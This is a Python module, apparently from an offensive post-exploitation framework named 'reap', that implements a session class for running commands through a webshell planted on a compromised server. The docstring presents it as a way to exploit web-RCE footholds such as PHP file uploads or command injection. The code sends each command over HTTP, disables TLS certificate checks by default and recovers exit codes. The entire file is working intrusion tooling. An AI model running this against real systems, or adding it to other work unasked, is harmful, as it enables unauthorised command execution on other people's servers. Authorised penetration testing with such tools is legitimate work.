"""WebShellSession - exec over an uploaded command webshell (HTTP request/response).

A clean request/response exec channel: one HTTP request per command, full output
returned. Added to attach reap to web-RCE footholds (e.g. an arbitrary-file-upload
to PHP, or a command-injection .php?cmd=) where the target account is nologin and
SSH/WinRM cannot attach. Honors the Session contract so every module runs unchanged.

You do NOT need a reverse shell: reap sends each command as a normal request and
reads stdout from the response body. Exit codes are recovered via an appended
high-entropy sentinel; if the sentinel is missing (truncated response, dead shell)
the call is reported as FAILED rather than silently succeeding.

For a Windows/cmd.exe-backed webshell pass ``shell="cmd"`` so the exit-code
wrapper uses ``%errorlevel%`` instead of the POSIX ``$?``.
"""
from __future__ import annotations

import re
import secrets
import ssl
import time
import urllib.parse
import urllib.request
from typing import Optional

from .base import Result, Session


class WebShellSession(Session):
    def __init__(
        self,
        url: str,
        param: str = "cmd",
        method: str = "POST",
        host: Optional[str] = None,
        session_id: Optional[str] = None,
        headers: Optional[dict] = None,
        verify: bool = False,
        shell: str = "sh",
    ):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.shell = shell.lower()          # 'sh' (POSIX) | 'cmd' (Windows)
        self.host = host or urllib.parse.urlparse(url).hostname or url
        self.session_id = session_id or f"webshell:{self.host}"
        self.headers = headers or {}
        # Per-session, high-entropy marker so leaked file content can never
        # collide with the exit-code sentinel.
        self._marker = "REAP_" + secrets.token_hex(8) + "_"
        self._rc_re = re.compile(re.escape(self._marker) + r"(-?\d+)")
        # Target webshells are almost always self-signed / IP-based, so default to
        # NOT verifying TLS (like `curl -k`). Pass verify=True to enforce it.
        self._ssl_ctx = None
        if not verify:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            self._ssl_ctx = ctx

    def _wrap(self, cmd: str) -> str:
        if self.shell == "cmd":
            return f"{cmd} & echo {self._marker}%errorlevel%"
        return f"{cmd}; printf '\\n{self._marker}%s' \"$?\""

    def exec(self, cmd: str, timeout: int = 30) -> Result:
        start = time.monotonic()
        wrapped = self._wrap(cmd)
        try:
            if self.method == "GET":
                full = self.url + "?" + urllib.parse.urlencode({self.param: wrapped})
                req = urllib.request.Request(full, headers=self.headers, method="GET")
            else:
                body = urllib.parse.urlencode({self.param: wrapped}).encode()
                req = urllib.request.Request(self.url, data=body, headers=self.headers,
                                             method="POST")
            with urllib.request.urlopen(req, timeout=timeout, context=self._ssl_ctx) as resp:
                out = resp.read().decode("utf-8", "replace")
        except Exception as exc:
            return Result("", str(exc), 1, time.monotonic() - start)

        dur = time.monotonic() - start
        m = self._rc_re.search(out)
        if not m:
            # No sentinel: the response was truncated or the shell died. Do NOT
            # report success — that would make failed/partial commands look OK.
            return Result(out, "sentinel missing (truncated response or dead shell)",
                          127, dur)
        try:
            code = int(m.group(1))
        except (ValueError, TypeError):
            code = 127
        body = out[:m.start()]
        if body.endswith("\r\n"):
            body = body[:-2]
        elif body.endswith("\n"):
            body = body[:-1]
        return Result(body, "", code, dur)

    def is_alive(self) -> bool:
        try:
            return self.exec("echo __alive__", timeout=10).out.strip().endswith("__alive__")
        except Exception:
            return False
